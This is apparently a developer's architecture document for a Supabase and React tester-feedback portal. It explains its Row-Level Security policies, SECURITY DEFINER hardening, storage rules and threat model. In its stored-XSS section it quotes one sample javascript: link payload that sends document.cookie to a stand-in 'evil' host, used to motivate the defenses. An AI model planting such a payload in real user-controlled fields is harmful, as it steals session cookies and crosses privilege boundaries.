# Architecture

I put every access rule for this app in the database, as Row-Level Security (RLS). It's two
surfaces on one Supabase project, and the React only mirrors what the database already enforces.
Throw the frontend away, hit PostgREST with the public anon key, and the same boundaries hold.
This doc is the tour of those boundaries.

- [The two surfaces](#the-two-surfaces)
- [Stack](#stack)
- [Data model](#data-model)
- [The security model](#the-security-model) ← the meat
- [Client auth flow](#client-auth-flow)
- [Migration-by-migration evolution](#migration-by-migration-evolution)
- [Threat model & known limitations](#threat-model--known-limitations)

## The two surfaces

| | Admin (program manager) | Tester |
|---|---|---|
| Identity | `profiles.is_admin = true` | any other signed-in user |
| Lands on | Dashboard (`/`) | My Feedback (`/my-feedback`) |
| Can do | manage the tester pipeline, schedule sessions, triage all feedback | submit / edit / withdraw their own feedback, reply in threads, watch status |
| Cannot do | (none) | reach any admin route or read another tester's data |

In practice the same person is both. You sign up (which lands you as a tester), then flip your
own `is_admin` flag in the SQL editor to unlock the admin side. There's deliberately no in-app
way to grant admin (see [the security model](#no-in-app-privilege-escalation)).

## Stack

Vite + React 18 + TypeScript, `@supabase/supabase-js`, `react-router-dom`, plain CSS. There's no
server of my own: the browser talks straight to Supabase (Auth, PostgREST, Storage). The anon
key ships to the client, which is exactly why RLS has to carry the security. There's no trusted
middle tier to enforce anything.

## Data model

```
auth.users ──1:1──> profiles (id, email, is_admin)
                       │
                       │ submitted_by
                       ▼
testers ──1:N──> sessions          feedback (type, body, status, tags[],
  (owner)         (owner)            screenshot_path, merged_into ──┐ self-ref
                                       │                            │ (dedup)
                                       │ feedback_id          ◄─────┘
                                       ▼
                                  feedback_comments (author, body)   append-only

storage: private bucket "screenshots", objects keyed  <uid>/<uuid>.<ext>
```

| Table | Purpose | Scoping rule |
|---|---|---|
| `profiles` | one row per auth user; carries `is_admin` | read own; admins read all |
| `testers` | CRM contacts in a recruitment pipeline | `owner = auth.uid()` (all verbs) |
| `sessions` | scheduled feedback calls, FK → `testers` | `owner = auth.uid()` (all verbs) |
| `feedback` | tester submissions (bug / confusion / request) | two-sided (see below) |
| `feedback_comments` | two-way reply thread per item | visible iff you can see the parent |

Enumerated columns are `text` + `CHECK` constraints, not Postgres `enum` types, so the allowed
values live in plain SQL and mirror `src/lib/types.ts`:

- `testers.status` → `prospect · invited · active · inactive`
- `sessions.status` → `scheduled · completed · no_show · canceled`
- `feedback.type` → `bug · confusion · request`
- `feedback.status` → `new · triaged · planned · shipped · declined`

`feedback.tags` is a `text[]` with a GIN index (`feedback_tags_idx`); the triage tag filter
queries it server-side via `.contains()` rather than filtering in the browser.
`feedback.merged_into` is a self-referential FK used for duplicate-merging during triage.

## The security model

Two RLS patterns sit side by side on purpose. (The snippets below show the plain
`auth.uid()` / `is_admin()` form for readability; the shipped policies wrap each call in
`(select …)`, see [§9](#9-one-evaluation-per-query-not-per-row).)

### 1. Owner-scoped (the simple case)

`testers` and `sessions` are private CRM data. One policy per table, all verbs, keyed on
ownership:

```sql
create policy "own testers" on public.testers
  for all using (auth.uid() = owner) with check (auth.uid() = owner);
```

`using` gates what you can read/update/delete; `with check` gates what you're allowed to write.
Both must equal `auth.uid()`, so you can neither see nor create rows owned by anyone else. That's
the whole story for the CRM half.

### 2. Role-based, recursion-safe (the interesting case)

`feedback` is two-sided: a tester sees only their own rows, an admin sees everyone's. "Is this
caller an admin?" means reading `profiles.is_admin`, but the `profiles` SELECT policy itself needs
that same answer. A naive policy that selects from `profiles` inside a `profiles` policy recurses
forever.

The fix is a `SECURITY DEFINER` helper that runs as its owner and so bypasses RLS on `profiles`,
which breaks the cycle:

```sql
create function public.is_admin() returns boolean
  language sql stable security definer set search_path = public
as $$
  select coalesce((select is_admin from public.profiles where id = auth.uid()), false);
$$;
```

Every role-aware policy then reads `public.is_admin()` instead of re-querying `profiles`. This is
the single most important pattern in the repo (`0002_feedback_portal.sql`).

### 3. Column-pinned write boundaries

A tester can submit feedback and, after `0005`/`0006`, edit or withdraw it, but only while it's
still untriaged. The naive INSERT policy (`submitted_by = auth.uid()`) left `status`, `tags`, and
`merged_into` wide open: a tester could `INSERT` a row already marked `shipped`, seed tags, or
point `merged_into` at any id. On **INSERT** the fix is to pin those columns in `WITH CHECK`. A
new row has no prior state, so "must equal the default" is exactly right:

```sql
create policy "submit own feedback" on public.feedback
  for insert with check (
    submitted_by = auth.uid()
    and status = 'new' and tags = '{}' and merged_into is null
  );
```

**UPDATE is where value-pinning bites you** (`0009` fixes a bug `0005`/`0006` shipped). A
`WITH CHECK` runs against the *post-update row* and has no access to `OLD`, so it can only assert
"tags is empty **now**," not "the tester didn't **change** tags." But admins set tags /
`merged_into` on an item while it's still `status='new'` (tag first, move status later, which is
normal triage). The instant they do, the row's `tags` is no longer `'{}'`, and the submitter's
next edit, even a typo fix that never touches tags, fails `tags = '{}'` and is rejected. Edit
silently breaks for any item an admin has tagged.

So the rule splits across two mechanisms. The policy owns **row scope** (your own row, still
untriaged); a `BEFORE UPDATE` **trigger** owns **column immutability** by comparing `OLD`/`NEW`,
the one thing a policy can't see:

```sql
create policy "edit own new feedback" on public.feedback
  for update
  using  (submitted_by = auth.uid() and status = 'new')
  with check (submitted_by = auth.uid() and status = 'new');   -- row scope only

-- column immutability for non-admin writers (0009)
create function public.feedback_lock_triage_columns() returns trigger ... as $$
begin
  if auth.uid() is null or public.is_admin() then return new; end if;  -- service role / admins bypass
  if new.status is distinct from old.status
     or new.tags is distinct from old.tags
     or new.merged_into is distinct from old.merged_into
     or new.submitted_by is distinct from old.submitted_by
  then raise exception 'testers may not modify status, tags, merged_into, or submitted_by';
  end if;
  return new;
end $$;
```

This restores the exact invariant `0005`/`0006` wanted (no self-promoting status, no seeded tags,
no merge target) without the equality brittleness. The normal client never trips the `RAISE`:
PostgREST only writes the columns in the request body, so unsent columns keep their `OLD` values
and compare equal. The trigger only stops a direct API write that *explicitly* sets a locked
column.

So **triage is admin-only at the database boundary**, not merely hidden in the UI. The admin
UPDATE/DELETE policies are separate and permissive; Postgres ORs permissive policies, so the two
sets coexist without interfering.

The client mirrors this: `MyFeedbackPage` only renders Edit/Delete while `status === 'new'`, so
the buttons never offer an action the database would reject.

This also clears a footgun from the original `0006` value-pin: a `status='new'` row that an admin
already tagged (or pointed `merged_into` at) is **still editable and withdrawable by its
submitter**. The trigger blocks only *changes* to the locked columns, and the edit form never
sends them. Under the old `tags = '{}'` `WITH CHECK`, any such pre-tagged row silently became
admin-only to touch; `0009` removed that.

### 4. Append-only comments

`feedback_comments` has SELECT and INSERT policies and **no UPDATE/DELETE policy at all**, so the
triage conversation is an immutable record; nobody can quietly rewrite what was said. Visibility
reduces to "you may touch a comment iff you can see its parent feedback," expressed as an
`EXISTS` subquery against `feedback`. That subquery runs under `feedback`'s own RLS, which already
restricts testers to their own rows, so no second `SECURITY DEFINER` and no cross-table recursion
is needed (`0007`).

### 5. Storage: private bucket + per-user folders + signed URLs

Screenshots live in a **private** `screenshots` bucket (`0008`). Objects are keyed
`<uid>/<uuid>.<ext>`, and the `storage.objects` policies check
`(storage.foldername(name))[1] = auth.uid()::text`, the storage equivalent of `owner = auth.uid()`.
A tester writes/reads/deletes only under their own uid folder; admins may read everyone's, for
triage. The feedback row stores only the **object path**; the app resolves a short-lived (300 s)
**signed URL on click**. `ScreenshotLink.tsx` signs when the link is actually opened, not once per
visible item on mount, so a long list isn't N eager round-trips and a stale-by-the-time-you-click
URL never happens. Nothing is publicly readable.

### 6. Defense-in-depth against stored XSS

The legacy `screenshot_url` column was user-controlled, and React does **not** sanitize `href`. A
value like `javascript:fetch('https://evil/?c='+document.cookie)` would execute in the *viewer's*
session when clicked, and the viewer is usually an admin in triage, so it crosses a privilege
boundary. Guarded on both sides:

- **Client.** `safeUrl()` allows only `http(s)` at render; anything else renders no link.
- **Server.** A `CHECK` constraint (`0004`) rejects any `screenshot_url` that isn't `http(s)`, so
  the rule holds even against a direct anon-key `INSERT` that never touches the React form.

New uploads sidestep this entirely by going through Storage (§5); the URL column remains only for
legacy rows.

### 7. SECURITY DEFINER hardening

`SECURITY DEFINER` functions run with the definer's privileges, so a mutable `search_path` is a
privilege-escalation vector. Every helper pins `set search_path = public`. Postgres also grants
`EXECUTE` to `PUBLIC` by default (which `anon`/`authenticated` inherit), so `0003` does
`REVOKE EXECUTE … FROM PUBLIC` and grants back only what's genuinely callable: `is_admin()` to
`authenticated`, `handle_new_user()` to nobody (it fires only as a trigger).

`is_admin()` and `merge_feedback()` stay callable by `authenticated` on purpose: the policies
evaluate `is_admin()` as the signed-in user, and `merge_feedback()` is the admin triage RPC. So
Supabase's linter still lists those two as "executable by signed-in users." That's expected, not a
miss. Both re-check authorization internally (`is_admin()` returns only the caller's own flag;
`merge_feedback()` gates on `is_admin()`), so calling them directly gets you nothing.

### 8. Atomic duplicate-merge + value constraints

Three boundary fixes that keep "the database is the source of truth" honest.

**Merge** (`0010`). Pointing a duplicate at its canonical submission is two writes: set
`source.merged_into = target`, then reparent the source's own duplicates onto `target` so the tree
stays one level deep. Done as two separate API calls, a partial failure corrupts the tree
(children yanked onto `target` while the source stays canonical, rows vanishing from the UI), and
the canonical-target / no-cycle rules were client-side only. So merging is a single
`SECURITY DEFINER` RPC, `merge_feedback(src, target)`: it re-checks `is_admin()`, rejects
`src = target`, requires `target` to exist and be canonical (which also makes a cycle impossible
given the one-level invariant), and does both updates in one function body, one transaction,
all-or-nothing. `AdminFeedbackPage` calls `supabase.rpc('merge_feedback', …)`; the client guards
remain only as fast UX.

**Table-level merge guard** (`0012`). Those rules in `merge_feedback` only protected the RPC path.
The `admins update feedback` policy still let an admin set `merged_into` to anything through a
direct PostgREST `UPDATE`, which could point a row at itself or two rows at each other and orphan
an item from triage (non-canonical with no canonical parent, so no unmerge button). A
`BEFORE INSERT/UPDATE OF merged_into` trigger now re-asserts no-self-merge and
canonical-only-target at the table, so the rules hold for every writer. The app never hits this
(triage always merges through the RPC), but it was the one spot where the integrity claim didn't
hold against a direct write.

**Value constraints** (`0011`). `feedback.body` was `text not null`, so `''` and `'   '` passed a
direct insert, nothing capped length, and `testers.email` was format-checked only in the form.
`0011` adds `CHECK`s at the boundary (non-empty trimmed body, length caps on body/notes, email
format), added `NOT VALID` so they enforce on every new write (including direct anon-key writes)
without failing the migration on pre-existing rows.

### 9. One evaluation per query, not per row

`auth.uid()` and `is_admin()` are `STABLE`, but inside an RLS policy Postgres re-invokes them once
*per row*. `0013` wraps every call in a scalar subquery, `(select auth.uid())` /
`(select public.is_admin())`, so the planner hoists it into an InitPlan evaluated once per
statement. Same results, far fewer calls at scale, and it clears Supabase's `auth_rls_initplan`
advisor. Behavior is identical, which is why `rls_smoke.sql` passes unchanged against the rewritten
policies.

### No in-app privilege escalation

There is intentionally **no UPDATE policy on `profiles`**. `is_admin` can only be flipped via the
service role (the SQL editor), never from the app with the anon key. Admin is a deploy-time
decision, not a feature.

## Client auth flow

```
AuthProvider (context/AuthContext.tsx)
  ├─ supabase.auth.getSession() + onAuthStateChange  → session/user (+ authError)
  └─ on user change: select * from profiles where id = uid → profile, isAdmin
                     (+ profileLoading, profileError)

App.tsx route guards
  ├─ RequireAuth   → no user           → redirect /auth
  ├─ RequireAdmin  → user but !isAdmin  → redirect /my-feedback
  └─ Home          → isAdmin ? Dashboard : redirect /my-feedback
```

The context keeps the *loading* signal separate from the *result*: `profile === null` means "no
profile row," not "still loading." `profileLoading` is the latter, and it's seeded from session
presence so the guards don't read a not-yet-fetched profile as `isAdmin=false` and bounce an admin
to the tester page in the gap. Folding the two together (the original bug) meant a genuinely
missing profile row, or an RLS/network error on the fetch, hung the app on a permanent spinner.
Now `getSession()` failures set `authError`, the profile fetch surfaces `profileError`, and the
guards render an actionable error with a Retry instead of spinning forever.

The guards are **convenience, not security**. They decide what to render, but a determined user
with the anon key can call PostgREST directly. That's fine, because RLS is the real gate; the
route guards just keep honest users out of views that would error. This "UI mirrors RLS"
principle recurs throughout (the Edit button, for instance, only appears when the DB would
actually allow the edit).

Writes that touch shared state use **optimistic updates with a targeted rollback**: apply the
change locally, fire the write, and on error revert *only the one field on the one row*, and only
if it still holds the value we just set, then surface the message (see
`AdminFeedbackPage.setStatus`, `TestersPage.moveStatus`). The narrow revert is deliberate: a
whole-array snapshot would discard any other edit made while the write was in flight, and a stale
failure would stomp a newer edit to the same field. So an RLS denial degrades to a visible error
and a reverted control, never a silent lie and never collateral damage to a concurrent edit.

## Migration-by-migration evolution

Migrations are **append-only**: fixes layer on as new files rather than editing applied history,
so the SQL on disk matches what actually ran on the remote.

| File | What it adds | Why it matters |
|---|---|---|
| `0001_init` | `testers`, `sessions`, owner-scoped RLS | the CRM half |
| `0002_feedback_portal` | `profiles`, `is_admin()`, `feedback`, signup trigger | role-based RLS, recursion fix |
| `0003_harden_functions` | pinned `search_path`, `REVOKE EXECUTE` | search-path hardening (see §7) |
| `0004_screenshot_url_scheme` | `http(s)` `CHECK` on `screenshot_url` | server half of XSS defense |
| `0005_restrict_feedback_insert` | pin `status`/`tags`/`merged_into` on INSERT | testers can't submit pre-triaged |
| `0006_tester_edit_own_feedback` | edit/withdraw own while `new` | with the same column pins |
| `0007_feedback_comments` | append-only reply thread | the "I feel heard" lever |
| `0008_screenshot_storage` | private bucket, per-user folder RLS, `screenshot_path` | real uploads, no pasted URLs |
| `0009_feedback_edit_column_lock` | trigger-enforced column immutability on UPDATE | fixes admin-tagging bricking a tester's edit (see §3) |
| `0010_merge_feedback_rpc` | atomic `merge_feedback()` `SECURITY DEFINER` RPC | partial-failure-proof dedup, server-side admin/cycle checks (see §8) |
| `0011_value_constraints` | non-empty/length/email `CHECK`s (`NOT VALID`) | validation at the boundary the docs claim (see §8) |
| `0012_feedback_merge_guard` | `BEFORE …` trigger re-asserting the merge rules on `merged_into` | the rules hold for a direct admin UPDATE, not just the RPC (see §8) |
| `0013_rls_initplan` | wrap `auth.uid()`/`is_admin()` in `(select …)` in every policy | once-per-query evaluation; clears the InitPlan advisor (see §9) |

## Threat model & known limitations

**What's defended.** Cross-tenant reads/writes (RLS on every table + Storage), privilege
escalation via INSERT/UPDATE column-stuffing (pinned `WITH CHECK`), stored XSS through
`screenshot_url` (client + server), `SECURITY DEFINER` search-path hijack, in-app self-promotion
to admin (no `profiles` UPDATE policy), dedup-tree corruption from a half-applied merge (atomic
RPC, `0010`) or a direct admin `UPDATE` (table guard, `0012`), and malformed/oversized input via
direct API writes (`CHECK` constraints, `0011`).

**Known gaps.**
- Storage cleanup is **client-side best-effort**: a tester's edit/replace/withdraw purges the
  superseded object (they own their folder per `0008`), but a failed cleanup call, or a future
  admin-initiated delete (no such UI today; admins would need a storage-delete policy), could
  still orphan an object. A trigger or Edge Function sweep would make it belt-and-suspenders.
- No pagination: the list views (`select("*")` on triage / testers / own-feedback) fetch all
  visible rows. The server-side status/tag filters narrow the set, but an unfiltered triage view
  still pulls everything. Fine at demo scale, not at thousands of rows.
- Concurrent admin edits are last-write-wins: the optimistic-update rollback guards a single
  admin's own in-flight races, but there's no `updated_at` precondition, so two admins editing the
  same row won't detect the conflict.
- No realtime: the triage board reflects submissions on reload, not live.
- Email confirmation is typically turned off for local hacking; turn it back on for any real
  deployment.
